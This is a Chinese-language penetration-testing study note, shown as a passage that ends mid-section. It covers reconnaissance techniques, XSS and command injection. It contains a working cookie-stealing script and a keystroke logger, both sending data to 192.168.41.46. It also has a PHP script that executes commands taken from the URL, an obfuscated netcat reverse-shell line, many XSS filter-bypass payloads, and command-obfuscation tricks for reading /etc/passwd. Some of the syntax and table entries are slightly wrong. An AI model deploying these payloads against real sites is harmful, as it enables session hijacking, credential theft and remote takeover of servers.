  (inurl:login|index)
  
  allinurl:login admin
  inurl:login admin
  ```

##### c. intext/allintext

* 寻找**正文**中含有关键字的网页，或指定正文中的**多个关键字**

* ```apl
  intext:登录    
  intext:"登录"
  
  allintext:后台 登录 公司
  allintext:"后台" "登录" "公司"
  ```

##### d. intitle/allintitle

* 寻找**标题**中含有的关键字的网页，或指定标题**多个关键字**

* ```apl
  intitle:后台登录
  intitle:"后台登录"
  
  allintitle:中国 后台 登录
  allintitle:"中国" "后台" "登录"
  ```

##### e.filetype

* 指定访问的**文件类型**

* ```apl
  filetype:doc|pdf|xlsx
  ```

### 3. 域名信息收集

#### (1). 备案信息号

##### a. ICP备案信息收集

* 爱站：https://icp.aizhan.com/
* 站长之家：https://icp.chinaz.com/
* ICP备案查询网：https://www.beianx.cn/search/
* 工信部ICP备案查询：https://beian.miit.gov.cn/

##### b.备案反查域名信息

* 备案信息包括单位名称、备案编号、**网站负责人**、**电子邮箱**、联系电话、法人等

* 工信部ICP备案查询：https://beian.miit.gov.cn/
* ICP备案查询网：https://www.beianx.cn/search/

#### (2). Whois信息收集

* 获取关键注册人信息，包括注册公司、注册邮箱、管理员邮箱、管理员联系手机等，甚至还能查询同一注册人注册的其他域名。域名对应的NS记录、MX记录、自动识别国内常见的托管商(万网、新网等)

* 国外who is ：https://who.is/
* 站长之家：http://whois.chinaz.com/
* 爱站：https://whois.aizhan.com/
* 微步：https://x.threatbook.cn/
* IP138网站：https://site.ip138.com/
* 腾讯云：https://whois.cloud.tencent.com/
* 狗狗查询：https://www.ggcx.com/main/integrated

#### (3). IP反查域名

* 目标可能存在多个域名绑定于同一IP上，通过IP反查可以获取到其他域名信息，比如**旁站**
* 通过获取目标真实IP后，进行反查的旁站更真实

##### a. 工具

* 站长工具：https://stool.chinaz.com/same
* dnslytics：https://dnslytics.com/
* ip138：https://site138.com
* Fofa：https://fofa.info
* 奇安信鹰图：https://hunter.qianxin.com/
* Shodan.io：https://www.shodan.io/

#### (4)Host碰撞

##### a. 现象

* IP访问响应多为：nginx、4xx、500、503、各种意义不明的Route json提示
* 域名解析到内网地址
* 有服务器真实IP，但找不到内网域名

##### b. 原因

* 中间件对IP访问做了限制，不能直接通过ip访问，必须使用域名进行访问。此时使用HOST碰撞技术，通过**将域名和IP进行捆绑碰撞，一旦匹配到后端代理服务器上的域名绑定配置**，就可以访问到对应的业务系统，从而发现隐形资产

##### c. 手法

![HOST碰撞手法](http://113.45.142.235:9001/laffrex/pictures/HOST%E7%A2%B0%E6%92%9E%E6%89%8B%E6%B3%95.png)

### 4. 子域名信息收集

#### (1). 收集原因

* 主域名防护严密，很难进入，选择进行**迂回攻击**

#### (2). 利用点

##### a. 资产类型

* 办公系统、邮箱系统、管理系统、网站管理后台、论坛、商城等系统

##### b. 利用方式

* 维护成本低于主域名，可能存在版本迭代、配置不安全、弱密码账号管理策略等

#### (3). 收集方法

##### a. 搜索引擎枚举

* 使用谷歌语法  `site:域名`

##### b. 在线网站

* 查子域：https://chaziyu.com/
* 微步社区：https://x.threatbook.com/
* VT：https://www.virustotal.com/gui/home/search
* RapidDNS：https://rapiddns.io/subdomain

##### c. 枚举子域名工具

###### ①Layer子域名挖掘机

*   https://github.com/euphrat1ca/LayerDomainFinder
*   支持**服务接口、暴力搜索、同服挖掘**三种模式

###### ②SubDomainsBrute

* https://github.com/lijiejie/subDomainsBrute
* 支持高并发DNS爆破和识别域名泛解析

###### ③Oneforall

* https://github.com/shmilylty/OneForAll
* 利用多个API接口模块收集子域名信息

###### ④Subfinder + ksubdomain + httpx

* https://github.com/Mr-xn/subdomain_shell
* 域名发现-> 域名验证  -> 获取域名标题、状态码及响应大小 -> 响应结果  

##### d. 证书透明度收集子域

###### ①crt.sh

* https://crt.sh/

##### e. JS文件中收集子域

###### ①JsFinder

| 参数 | 含义             |
| ---- | ---------------- |
| -u   | 指定url          |
| -d   | 深度爬取         |
| *-j* | 指定从js文件获取 |

###### ②URLFinder

| 参数 | 含义                         |
| ---- | ---------------------------- |
| -d   | 指定获取的域名               |
| -f   | 批量url抓取，指定url文本路径 |
| -m   | 抓取模式                     |
| -s   | 显示状态码，all为全部        |
| -u   | 指定URL                      |

##### f. 第三方聚合应用

###### ①dnsdumpster

* http://dnsdumpster.com

###### ②dnsdb

* https://dnsdb.io/zh-cn

###### ③灯塔ARL自动化收集

* https://github.com/honmashironeko/ARL-docker

##### g. 域传送漏洞

* DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间同步数据库，需要使用**DNS域传送**
* 域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库
* DNS服务器配置不当，导致匿名用户利用DNS域传送协议获取某个域的所有记录，通过可以实现DNS域传送协议的程序，尝试匿名进行DNS域传送，获取记录
* **Crossdomain.xml**文件用于**跨域策略文件**，主要为Web客户端(Adobe Flash Player等)设置跨域处理数据的权限

### 5.服务器信息收集

#### (1). 端口扫描

* 扫描工具：Nmap、Zenmap、masscan

##### a. 文件共享服务

| 端口号   | 端口说明                | 利用方向                       |
| -------- | ----------------------- | ------------------------------ |
| 21/22/69 | FTP/TFTP文件传输协议    | 允许匿名上传、下载、爆破和嗅探 |
| 2049     | NFS服务                 | 配置不当                       |
| 139      | Samba服务               | 爆破、未授权访问、远程代码执行 |
| 389      | LDAP目录访问协议(类RDP) | 注入、允许匿名访问、弱口令     |

##### b. 远程连接服务

| 端口号 | 端口说明        | 利用方向                                     |
| ------ | --------------- | -------------------------------------------- |
| 22     | SSH远程链接     | 爆破、SSH隧道及内网代理转发、文件传输        |
| 23     | Telnet          | 爆破、嗅探、弱口令                           |
| 3389   | RDP远程桌面连接 | Shift后门(Windows Server 2003以下版本)、爆破 |
| 5900   | VNC             | 弱口令爆破                                   |
| 5632   | PyAnywhere服务  | 抓密码、代码执行                             |

##### c. Web应用服务

| 端口号      | 端口说明                 | 利用方向                          |
| ----------- | ------------------------ | --------------------------------- |
| 80/443/8080 | 常见Web服务端口          | Web共攻击、爆破、对应服务版本漏洞 |
| 7001/7002   | Weblogic控制台           | Java反序列化、弱口令              |
| 8080/8089   | Jboos/Resin/Jettyjenkins | 反序列化、控制台弱口令            |
| 90900       | WebSphere                | Java反序列化、弱口令              |
| 4848        | GlassFish控制台          | 弱口令                            |
| 1352        | Lotus dominion邮件服务   | 弱口令、信息泄露、爆破            |
| 10000       | Webmin-Web控制面板       | 弱口令                            |

```
443 80 8081 8088 8888 8443 888 8080-8089
```

##### d. 数据库服务

| 端口号      | 端口说明    | 利用方向                    |
| ----------- | ----------- | --------------------------- |
| 3306        | MySQL       | 注入、提权、爆破            |
| 1433        | MSSQL       | 注入、提权、爆破、SAP弱口令 |
| 1521        | Oracle      | TNS爆破、注入、反弹shell    |
| 5432        | PostgreSQL  | 爆破、注入、弱口令          |
| 27017/27018 | MongoDB     | 爆破、未授权访问            |
| 6379        | Redis       | 未授权访问、弱口令爆破      |
| 5000        | SysBase/DB2 | 爆破、注入                  |

##### e. 邮件服务端口

| 端口号 | 端口说明     | 利用方向   |
| ------ | ------------ | ---------- |
| 25     | SMTP邮件服务 | 邮件伪造   |
| 110    | POP3         | 爆破、嗅探 |
| 143    | IMAP         | 爆破       |

##### f. 网络常见协议端口

| 端口号 | 端口说明        | 利用方向                              |
| ------ | --------------- | ------------------------------------- |
| 53     | DNS域名解析系统 | 允许区域传送、DNS劫持、缓存投毒、欺骗 |
| 67/68  | DHCP服务        | 劫持、欺骗                            |
| 161    | SNMP协议        | 爆破、搜集目标内网信息                |

##### e. 特殊服务

| 端口号      | 端口说明               | 利用方向              |
| ----------- | ---------------------- | --------------------- |
| 2128        | Zookeeper服务          | 未授权访问            |
| 8068        | Zabbix服务             | 远程执行、SQL注入     |
| 9200/9300   | Elasticsearch服务      | 远程执行              |
| 11211       | Memcache服务           | 未授权访问            |
| 512/513/514 | Linux Rexec服务        | 未授权访问            |
| 873         | Rsync服务              | 匿名访问、文件上传    |
| 3690        | SVN服务                | SVN泄露、未授权访问呢 |
| 50000       | SAP Management Console | 远程执行              |

#### (2). 操作系统判断

##### a. 开放端口

| Win系统常见端口 | Linux系统常见端口   |
| --------------- | ------------------- |
| IIS-80          | ssh-22              |
| rpc/135         | NETBIOS-137 138 139 |
| smb-445         |                     |
| rdp-3389        |                     |
| mssql-1433      |                     |

##### b. 大小写

* Windows对**大小写不敏感**，而Linux对**大小写敏感**

##### c. TTL值

* ping命令，**返回TTL值**，**Windows通常是128**，大于100；**Linux是64**，小于100

##### d. 其他方式

* 网站的脚本类型：asp、aspx、jsp、php
* phpinfo的信息泄露
* 等等

### 6. 网站信息收集

#### (1). CMS指纹识别

##### a. 作用

* 通过识别指纹，可以确定**目标的CMS及版本**，进一步利用公开的**POC**或**EXP**进行攻击

##### b. 工具

1. kali中的whatweb
2. 云悉：http://www.yunsee.cn/
3. 潮汐：http://finger.tidesec.net/
4. Wappalyzer插件
5. Glass：https://github.com/s7ckTeam/Glass
6. 棱洞：https://github.com/EdgeSecurityTeam/Ehole

##### c. 漏洞利用

1. **常规搜索引擎**，直接搜索识别到的CMS指纹漏洞
2. **乌云漏洞库**
3. Cnvd搜索识别到的cms指纹
4. Github搜索识别到的指纹
5. 源代码审计
   1. 全文通读——漏洞挖掘最全
   2. 敏感函数回溯——方便快捷挖掘漏洞
   3. 代码、命令执行
      * php**代码执行**函数
      * php**命令执行**函数
   4. 定向功能分析法——定向挖掘某块功能的漏洞

#### (2). 判断Web中间件

##### a. 解析漏洞

1. 了解网站的**Web服务器**是那种
2. 了解具体的Web服务器**版本**
3. 寻找对应的**解析漏洞**

#### (3). 判断脚本类型

* 根据网站URL判断
* 谷歌语法：``site:xxx filetype:php``
* 根据firefox的插件来判断
* 目录爆破/文件爆破
* 漏洞扫描器(awvs、xray、appscan)

#### (4). 判断数据库类型

##### a. 类型

###### ①Access

* 全名是Microsoft Office Access，小型数据库，>100M时性能下降，**后缀名：.mdb**，一般是asp网页文件使用

###### ②SQL Server

* 关系型数据库管理系统(DBMS)，后缀名：**.mdf**，默认端口**1433**

###### ③MySQL

* DBMS，属于Oracle旗下产品，默认端口**3306**

###### ④Oracle

* DBMS，适用于大型网站，默认端口**1521**

##### b. 判断方式

###### ①端口

| 数据库 | 端口 |
| ------ | ---- |
| MSSQL  | 1433 |
| MySQL  | 3306 |
| Oracle | 1521 |

###### ②脚本类型

| 脚本      | 数据库             |
| --------- | ------------------ |
| ASP、ASPX | ACCESS、SQL Server |
| PHP       | MySQL、PostgreSQL  |
| JSP       | MySQL、Oracle      |

###### ③漏洞扫描器

#### (5). 目录结构

###### ①常见敏感文件

* .SVN泄露
* .git泄露
* 网站备份压缩文件
* 御剑7kbwebpathscanner
* .DS_Store文件
* WEB-INF文件
* Web.config配置文件
* 配置文件泄露

###### ②常见工具

* **Burpsuite**
* **御剑**
* Dirbuster java
* Dirb
* dirsearch
* 7kbscan
* **搜索引擎**

### 7. 真实IP信息收集

#### (1). CDN绕过

##### a. 常规方法

###### ①国外访问或多地区访问

* 如果只针对国内用户的访问加速，使用国外代理网站(Monitor:https://asm.ca.com/en/ping.php)则可以获取到**服务器真实IP**

###### ②历史DNS记录查找

###### ③子域名查找

* 如果分站没挂载CDN，但**和主站在同一C段下**，则可以通过子域名获取分站IP

###### ④网站漏洞查找

* 通过**网站漏洞**，扫描网站**测试文件**，例如phpinfo、test等，从而找到目标真实IP

###### ⑤网站邮件查找

* 查找**邮件头**中的**邮件服务器域名IP**

##### b. 非常规方法

###### ①扫描全网

* 在线网站：钟馗之眼、shodan、fofa
* 直接尝试用IP访问，看看响应的页面和访问域名返回的是否一样

#### (2). 判断是否存在CDN

##### a. 多地ping

* http://ping.chinaz.com/
* https://ping.aizhan.com/
* 结合**fofa搜索对应IP地址**辨别真实IP地址

##### b. Nslookup

* 获取到的DNS域名解析结果中返回多个IP的，一般存在CDN服务

##### c. Header头信息

* 请求响应包**header头**中存在CDN服务商信息
* 报错信息，页面状态码为**400错误**，一般是CDN
* 若asp或者asp.net网站返回头的Server不是IIS，而是Nginx，即是使用了nginx反向代理到CDN

##### d. 在线检测工具

* https://www.cdnplanet.com/tools/cdnfinder/
* https://tools.ipip.net/cdn.php

#### (3). 真实IP收集

##### a. DNS历史记录

* http://viewdns.info/iphistory/?domain=
* https://securitytrails.com/
* https://x.threatbook.com/
* https://site.ip138.com/

##### b. 网络空间测绘搜索引擎

###### ①网站

* https://fofa.info
* https://search.ccenysy,io
* https://quake.360.net
* https://hunter.qianxin.com
* https://www.shodan.io

###### ②用法

* **子域名**、https证书、网站标题、**网站图标**、**ICP备案信息**、html正文内容、js/css/html静态资源特征值

###### ③fofa语法

```
domain=="ichunqiu.com"	//搜索根域名为“ichunqiu.com”的网站
host="ichunqiu.com"		//从url中搜索
cert=="ichunqiu.com"	//从https证书中搜索
cert=="https证书序列号值10进制"	//利用证书序列号定位
icp="京ICP证150695号"	 //利用备案号定位
title="在线安全培训平台"	//利用网站标题特征定位
icon_hash="-1941347393"		//利用网站icon图标特征定位
body="会员登录_i春秋"		//利用html正文特征定位
body="<div class=header_hostsearch J_header_hotsearch>"	//利用网站静态资源文件定位
fid=""		//利用fofa网站指纹定位
```

### 8. C段/旁站信息收集

###### ①概念

```
旁站：	和目标网站在同一服务器上的其他网站
C段：	和目标服务器ip处在同一个C段的其他服务器
```

###### ②查询方式

1. 利用Bing.com，语法为 

   ```
   http://cn.bing.com/search?q=ip:1.1.1.1
   ```

2. 站长之家http://s.tool.chinaz.com/same

3. 利用Google.com.语法为

   ```
   site:123.123.123.*
   ```

4. 利用Nmap，语法为

   ```
   nmap -p 80,8080 -open ip/24
   ```

5. K8工具、御剑、北极熊扫描器等

6. 在线网站：http://www.webscan.cc/

### 9. 企业信息收集

![企业信息收集](http://113.45.142.235:9001/laffrex/pictures/%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png)

## XSS

### 1. 概述

#### (1). 定义

* 跨站脚本攻击XSS，指通过某种方法将**恶意的Script代码**注入到Web页面中，当**用户浏览该页**之时，**嵌入**其中Web里面的Script代码**会被执行**，从而达到**恶意攻击用户**的目的

#### (2). 原理

* XSS，是指攻击者通过在**Web页面中写入恶意脚本**，造成用户在浏览页面时，获取控制用户浏览器进行操作的攻击方式

  ![XSS原理](http://113.45.142.235:9001/laffrex/pictures/XSS原理.png)

#### (3). 产生条件

> 1. 可以控制的输入点
> 2. 输入能返回到前端页面上，**被浏览器当做脚本语言解释执行**

#### (4). 危害及防御

##### a. 危害

> 1. 获取用户Cookie
> 2. 键盘记录
> 3. 客户端信息探查
> 4. XSS组合其他漏洞getshell
> 5. 劫持用户会话，执行任意操作

##### b. 防御

> 1. **过滤**用户提交的**有害信息**
> 2. 对用户**输入**的信息进行**合法性校验**
> 3. 使用**HTML实体编码**代替字符

### 2. 分类

#### (1). 反射型

##### a. 定义

* **非持久性**、参数型的跨站脚本

##### b. 攻击方式

* 需要**欺骗用户去点击恶意链接**才能触发XSS代码，一般容易出现在搜索框

  ![反射型原理](http://113.45.142.235:9001/laffrex/pictures/反射型原理.png)

#### (2). 存储型

##### a. 定义

* 持久型，能够将恶意代码写进**数据库或文件**，长久保存在数据介质中

##### b. 攻击方式

* 通过**数据写入点**，将精心构造的XSS代码**保存到数据库**中，当其他用户**再次访问**时，就会**触发并执行**恶意的XSS代码

  ![存储型原理](http://113.45.142.235:9001/laffrex/pictures/存储型原理.png)

#### (3). DOM型

##### a. 定义

* **不经过后端**，输出点在**DOM**，通过**url传入参数**去控制触发，属于反射型XSS

##### b. 攻击方式

> 1. 攻击者构造**特殊的URL**，其中包含恶意代码，用户点击恶意链接
> 2. 用户浏览器接收到响应后解析执行，**前端JS取出**URL中的恶意代码**并执行**
> 3. 恶意代码窃取到用户数据并发送到攻击者的网站，来进行进一步的操作

#### (4). 区别

##### a. 存储型与反射型

* 存储型XSS的恶意代码在**数据库**，而反射型XSS的恶意代码在**URL里**

##### b. DOM型与其他

* DOM型XSS攻击，取出和执行恶意代码**由浏览器完成**，属于前端**JavaScript自身的安全漏洞**，另外两种属于**服务端的**安全漏洞

### 3. 漏洞利用

#### (1)获取管理权限

* 通过获取**Cookie**，从而获取管理员权限

##### a. 实例

```php
#index.php页面，模拟真实用户的使用，但留有JS后门
<?php
if(isset($_POST['submit'])){
    setcookie("name","goodjob");
}
?>
<html>
<script type="text/javascript" src="cookie.js"></script>    
<meta charset="utf-8">
<form action="#" method="post" id="form1">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <input type="submit" name="submit" value="submit" />
</form>
</html>

//cookie.js文件，执行恶意操作(获取到cookie并通过指定url传递出去)
var img= document.createElement('img');
img.width= 0;
img.height= 0;
img.src='http://192.168.41.46/xss/cookie/cookie.php?cookie=' 
+ encodeURIComponent(document.cookie);

//cookie.php文件，接收cookie.js传递出的数据，并存储在txt文件中
<?php
$cookie = $_GET['cookie'];
$log = fopen('cookie.txt','a');
fwrite($log,$cookie.PHP_EOL);
fclose($log);
?>
```

#### (2)获取键盘记录

* 利用**ajax发送HTTP**请求

##### a. 发送请求

* 使用**open()和send()**方法

  ![AJAX方法](http://113.45.142.235:9001/laffrex/pictures/AJAX方法.png)

###### ①GET请求

```js
xmlhttp.open("GET","url地址",true);
xmlhttp.send();
```

###### ②POST请求

```js
xmlhttp.open("POST","url地址",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("fname=Henry&lname=Ford");
```

##### b. 接受请求

* 使用XMLHttpRequest对象的**ResponseText**和**ResponseXML**属性

![AJAX的http响应](http://113.45.142.235:9001/laffrex/pictures/AJAX的http响应.png)

###### ①onreadystatechange

* readystate有5个取值，分为6个阶段

  1. 取值对应

     | 取值 | 含义                     |
     | ---- | ------------------------ |
     | 0    | 请求未初始化             |
     | 1    | 服务器连接已建立         |
     | 2    | 请求已接收               |
     | 3    | 请求处理中               |
     | 4    | 请求已完成，且响应已就绪 |

  2. 阶段分类

     创建 -> 初始化请求 -> 发送请求  -> 接收数据  -> 解析数据  -> 完成

##### c. 实例

```php
#index.html网页模拟用户真实体验
<html>
    <head></head>
    <script type="text/javascript" src="log.js"></script>    
    <meta charset="utf-8">
    <body>
        <form action="#" method="post" id="form1">
            <label>输入用户名</label>
            <input type="text" name="username" />
            <br>
            <label>输入密码</label>
            <input type="text" name="password" />
            <br><br>
            <input type="submit" name="submit" value="submit" />
        </form>
    </body>
</html>

#log.js文件执行恶意操作(获取到用户数据并通过指定url传递出去)
document.onkeypress=function(evt){
    evt=evt?evt:window.event;
    key=String.fromCharCode(evt.keyCode?evt.keyCode:evt.charCode);
    if(key){
        var http = new XMLHttpRequest();
        var param = encodeURI(key);
        http.open("POST","http://192.168.41.46/xss/keyboard/log.php",true);
        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        http.send("key="+param);
    }
}
#log.php文件，log.js传递出的数据，并存储在txt文件中
<?php
$key=$_POST['key'];
$logfile='result.txt';
$fp=fopen($logfile,"a");
fwrite($fp,$key);
fclose($fp);
?>
```

****

### 4. JS伪协议

##### a. data://伪协议

```html
<!--1. 编码内容为 <script>alert(1)</script>  -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

<!--2. 编码内容为 <script>alert(1)</script> -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>

<!--3. -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<!--4. 将部分字符url编码-->
<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C%2Fscript%3E"></iframe>
```

##### b. javascript伪协议

```html
<a href="javascript:alert('a')">1</a>
<img src='#' onerror="javascript:alert('a')"></img>
```

****

### 5. XSS构造

#### (1).利用<>构造标签

* **没有任何过滤**机制时使用

#### (2).伪协议

* 使用**javascript:**等伪协议构造XSS

* 支持的标签：**src**、**href**、background等

  ```html
  <a href="javascript:alert(/xss/)">touch me!</a>
  <img src="javascript:alert(/xss/)"></img>		//仅在IE6下成功
  ```

#### (3).事件利用

* 可以利用html中某些**动作时间**，绑定**恶意脚本**

* 常见事件类型

  | window事件   | 对window对象触发的事件         |
  | ------------ | ------------------------------ |
  | Form事件     | HTML表单内的动作触发事件       |
  | Keyboard事件 | 键盘按键                       |
  | Mouse事件    | 由鼠标或类似用户动作触发的事件 |
  | Media事件    | 由多媒体触发的事件             |

  ```html
  <img src='./smile.jpg' onmouseover='alert(/xss/)' />
  <input type="text" onkeydown="alert(/xss/)" />
  <input type="text" onkeyup="alert(/xss/)" />
  <input type="button" onclick="alert(/xss/)" />
  <img src='#' onerror='alert(/xss/)' />
  ```

#### (4).利用CSS触发(已过时)

#### (5)其他标签及手法

* 随着前端语言的更新速度，会有**新的标签和事件**出现

  ```html
  <svg onload="alert(/xss/)" >	//svg是h5语言中的标签
  <input onfocus=alert(/xss/) autofocus >	//自动触发
  ```

****

### 69. XSS变形

#### (1)大小写转换

* 将payload进行大小写转化

  ```html
  <img sRc='#' OnError="alert(/xss/)">
  <a hREf='JaVaScriPt:alert(/xss/)'>click me</a>
  ```

#### (2)引号的使用

* HTML对引号不敏感，但过滤函数对引号严格

  ```html
  <img src="#" onerror="alert(/xss/)" />
  <img src='#' onerror='alert(/xss/)' />
  <img src=# onerror=alert(/xss/) />
  ```

#### (3)左斜线代替空格

```html
<img src="#"/onerror="alert(/xss/)" />
```

#### (4)回车的使用

* 添加**水平制表符**和**回车符**来绕过关键字检测

```html
	
	<a href="javascript:alert(/xss/)">clike me</a> =>
<!--水平制表符-->
	<a href="j	a	v	a	s	c	r	i	p	t	:	alert(/xss/)">clike me</a>
<!--回车符-->
<a href="j
         a
         v
         a
         s
         c
         r
         i
         p
         t
         :alert(/xss/)">clike me</a>
	<a href="javascript:alert(/xss/)">clike me</a>
```

* **一些函数不可以加回车**(onmoveover、onerror等)

#### (5)双写绕过

* 针对只做了**一次过滤**的情况

* ```html
  <script>alert(1)</script>	=>  <scr<script>ipt>alert(1)</scr</script>ipt>
  
  ```



#### (6)CSS中的变形

```html
a.使用全角字符
    "><img src="#" ｏｎｅｒｒｏｒ="alert(/xss/)" /><"
b.注释会被浏览器忽略
    "><img src="#"  oner/*~*/ror="alert(/x~s~s/)" /><"
c. 样式表中的[\]和[\0]
    "><style>@import 'javasc\ri\0pt:alert*(/xss/)';</style><"
```



#### (7)对标签属性值进行转码

* 对标签值使用**十进制**或**十六进制**表示

  ```html
  1. 转码
      "><a href="javascript:alert(/xss/)">click me</a><" => 
      "><a href="j&#97;v&#x61;script:alert(/xss/)">click me</a><"
      "><a href="&#1;j&#97;v&#x61;s&#9;c&#10;r&#13;ipt:alert(/xss/)">click me</a><"
  2. 进阶变形
       "><img src="#" onerror=alert(1)></img><" => 
       "><img src="#" onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;></img><"	
          or
      "><img src="#" &#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;></img><"
  ```

  | 符号            | ASCII码 | 十进制   | 十六进制 |
  | --------------- | ------- | -------- | -------- |
  | a               | 97      | `&#97;`  | `&#61;`  |
  | e               | 101     | `&#101;` | `&#x65;` |
  | Tab(水平制表符) | 9       | `&#9;`   |          |
  | 换行            | 10      | `&#10;`  |          |
  | 回车            | 13      | `&#13;`  |          |
  | SOH             | 1       | `&#1;`   |          |
  | STX             | 2       | `&#2;`   |          |

#### (8)拆分跨站

* 当应用程序**没有过滤**关键字符，却对**输入字符长度有限制**时，可以使用**拆分法**

  ```html
  <script>z='alert'</script><script>z=z+'(/xss/)'</script><script>eval(z)</script>
  ```

#### (9)HTML编码

##### a. 十进制

* 标识符：``&# + Ascii码``

  ```html
  <a href="javascript:alert(/xss/)">click me</a>	=> 
  1. 
  	<a href="j&#97;v&#97;script:alert(/xss/)">click me</a>
  2.
  	 
      <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
          or
      <img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
      
  ```

##### b. 十六进制

* 标识符：``&#x``

  ```html
  <a href="javascript:alert(/xss/)">click me</a>	=> 
  1. 
  	<a href="j&#x61;v&#x61;script:alert(/xss/)">click me</a>
  2. 
  	<img src=x onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")>
  		or
  	<script>eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</script>
  ```

##### c. 其他编码

###### 	①Unicode编码

```html
<img src='x' onerror=eval("\0061\006c\0065\0072\0074\0028\0031\0029")>
<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

#### 	(1)jsfuck混淆

* 将js代码转换成混淆之后的格式
* 在线转换网站http://www.jsfuck.com/

## 命令执行

### 1. 定义

* 应用程序直接或间接使用了**动态执行命令的危险函数**，并且这个函数的运行**参数是可控**的，导致恶意命令执行

### 2. 防御

> 1. 尽量**少使用执行命令函数**或者**禁用disable_functions**
> 2. 在进入执行命令的函数之前，对**参数进行过滤**，对**敏感字符进行转义**
> 3. 参数值尽量使用**引号包括**，并在拼接前调用**addslashes进行转义**

### 3. 涉及函数

#### (1). 代码命令执行

> eval()、assert()、preg_replace()、create_function()、asort()、
>
> array_map()、array_filter()、
>
> call_user_func()、call_user_func_array()

#### (2). 系统命令执行

> system()、exec()、shell_exec()、passthru()、popen()、反引号

```php
<?php
if(isset($_GET['cmd'])){
    $cmd= $_GET['cmd'];
#1. system，自带输出
    system($cmd);  echo '<br>1<br>';
#2. exec，无输出，且仅输出最后一行
    print exec($cmd);  echo '<br>2<br>';
#3. shell_exec
    echo shell_exec($cmd);  echo '<br>3<br>';
#4. passthru，直接将结果输出
    passthru($cmd);  echo '<br>4<br>';
#5. popen，返回一个文件指针,无回显
    $cmd= $_GET['cmd'].">>1.txt";
     popen($cmd,'r');  echo '<br>5<br>';
#6. 反引号，原理是调用的shell_exec函数
    $cmd= $_GET['cmd'];
    print `$cmd`;  echo '<br>6<br>';
}
?>
```

### 4. 多命令执行语法

#### (1). windows

| 命令格式                 | 含义                                           |
| ------------------------ | ---------------------------------------------- |
| command1**&**command2    | 先后执行，无论command1是否成功                 |
| command1**&&**command2   | 先后执行，command1成功，才执行command2         |
| command1**\|\|**command2 | 先后执行，command1失败，才执行command2         |
| command1**\|**command2   | \|是管道符，将command1的执行结果传递给command2 |

#### (2). Linux

| 命令格式                 | 含义                                       |
| ------------------------ | ------------------------------------------ |
| command1**;**command2    | 先后执行，无论command1是否成功             |
| command1**&&** command2  | 先后执行，command1成功，才执行command2     |
| command1**&**command2    | 先执行command1并放置后台，在执行command2   |
| command1**\|\|**command2 | 先后执行，command1失败，才执行command2     |
| command1**\|**command2   | 管道符，将command1的执行结果传递给command2 |

### 5. 变形

#### (1). Linux

#####  a. bash通配符

| 通配符 | 通配符解释                      | 案例                          | 案例解释                       |
| ------ | ------------------------------- | ----------------------------- | ------------------------------ |
| *      | 代表**0到无穷多个**任意字符     | /bin/cat /etc/*wd             | 查看/etc文目录下以wd结尾的文件 |
| ?      | 代表一定有1个任意字符           | /b?n/cat /etc/pass?d          | 查看/etc文目录下符合要求的文件 |
| []     | 代表**一定有1个在括号内**的字符 | /bin/cat /etc/[pwe]ass[aswd]d |                                |
| -      | 代表**在编码顺序内的所有**字符  | [0-9]                         | 0到9之间的所有数字             |
| ^      | 代表**反向选择**                | [^abc]                        | 一定没有一个括号内的字符       |

##### b. IP转数字，数字转IP

```bash
192.168.12.151 =>  3232238743
反弹shell的使用： 	/???/nc -e /???/b??h 3232238743 1234
```

##### c. 连接符

```bash
#原型：/bincat /etc/passwd
1. 单引号： ''包裹
	/b'i'n/c'a't /e't'c/'p'a's's'w'd
2. 双引号
	c"a"t /"e"t"c"/"p"a"s"s"w"d
3. 反斜杠
	c\a\t /e\t\c/p\a\s\s\w\d
```

##### d. 未初始化的变量

* **未初始化**的变量，直接使用时，变量值为**null**

```bash
echo $a $b $c
#执行whoami的变形
a=w;b=hoa;c=mi;$a$b$c
```

##### e. 反引号执行

* 在Linux下，反引号中间的字符能够被当做命令执行

```bash
#执行whoami命令：
`whoami`
who`sadasdasdfasfas`am`safqwafasfa`i
```

##### f. 其他符号

* **大括号**、**重定向**符号绕过**空格**的过滤

```bash
1. 大括号
    #执行的 cat /etc/passwd命令：
    {cat,/etc/passwd}

    #执行ls -la指令：
    {ls,la}
2. 重定向
	#小于号是输入重定向，就是把后面跟的文件取代键盘作为新的输入设备，大于号是输出重定向
	a. 执行ls
		l<>s
```

##### g. base64编码

1. 首先echo [命令] | base64

   ```bash
   echo whoami | base64 
   ```

2. 将命令以base64编码的形式表示出来

   ```bash
   echo [编码之后的命令] | base64 -d		#-d指令表示进行解码
   ```

3. 使用反引号执行该字符串

   ```bash
   `echo [编码之后的命令] | base64 -d`
   ```

##### h. 默认字符命令

* echo **${#PATH}** 可以**截取**字符串

  ```bash
  echo ${#PATH5:1}		=>   l
  echo ${#PATH5:1}echo ${#PATH2:1}		=>	ls
  `echo ${#PATH5:1}${#PATH2:1}`		=>	ls
  ${#PATH5:1}${#PATH2:1}		=>	ls
  ```

#### (2). Windows

##### a. 大小写混合

* **双引号**、**^**和**成对的圆括号** 并不会影响命令的执行

  ```cmd
  whoami	=>
  	w"h"o"a"m"i"
  	(((whoami)))
  	w^h^o^a^m^i		#不能是 ^^ ，2个^代表转义
  ```

##### b. set命令和windows变量绕过

```cmd
set a=whoami
echo a		#输出：whoami
echo %a%	#输出：whoami命令执行结果

set z=ipc
set x=onfig
%z%%x%		#输出：ipconfig的执行结果
```

##### c. 字符串的切割

* %变量名:~x,y% ：变量从第x个元素开始提取，总共取y个字符

```cmd
